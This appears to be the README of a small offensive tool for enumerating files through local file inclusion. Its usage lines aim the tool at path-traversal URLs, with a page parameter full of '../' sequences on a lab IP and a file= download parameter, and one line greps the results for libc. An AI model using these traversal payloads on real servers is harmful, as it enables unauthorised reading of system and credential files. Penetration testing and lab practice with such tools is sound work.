# sl0ppy-lfi
small lfi enum tool 

# Usage 

# Enum all
`./sl0ppy-lfi http://10.10.11.154/index.php?page=../../../../../../../../../../` 

# enum specific stuff like only libc
`./sl0ppy-lfi http://10.10.11.154/index.php?page=../../../../../../../../../../ | grep "libc"` 

# sl0ppy-ProcessInfo
`./sl0ppy-ProcessInfo http://server.vulnerable.com/download.php?file=` 
